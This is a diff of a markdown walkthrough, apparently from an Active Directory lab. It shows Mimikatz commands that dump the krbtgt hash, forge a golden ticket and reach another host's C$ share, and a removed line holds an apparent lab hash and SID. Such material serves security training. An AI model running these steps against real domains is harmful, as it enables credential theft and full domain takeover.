@@ -10,17 +10,32 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
 
+![OnPaste 20220614-120938](https://user-images.githubusercontent.com/106917304/173510236-d02a0fdd-2e67-4a81-9763-e6d210e480bc.png)
 
 
 Now generate golden ticket using krbtgt hash and sid.
 ```markdown
-Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
+kerberos::golden /user: /domain: /sid: /krbtgt: /id:
 ```
 NOTE: id is set to 500 for golden ticket attack.
 
-Now run the cmd to use ticket.
+
+![OnPaste 20220614-121203](https://user-images.githubusercontent.com/106917304/173510532-09a2930d-83f2-4137-b483-b5461c6e3ed4.png)
+
+
+This will open a new command prompt with elevated privileges to all machines.
 ```markdown
 misc::cmd
+```
+![OnPaste 20220614-121351](https://user-images.githubusercontent.com/106917304/173510764-a28e6a59-7adf-4e2f-9b23-7a4f98a5e89d.png)
+
+
+Access other Machines! - You will now have another command prompt with access to all other machines on the network.
+
+```markdown
 dir \\DESKTOP-1\c$
 ```
+
+![OnPaste 20220614-121503](https://user-images.githubusercontent.com/106917304/173511018-f5e167eb-8cd5-46d9-91a3-d8c4ab2ce233.png)
+
 
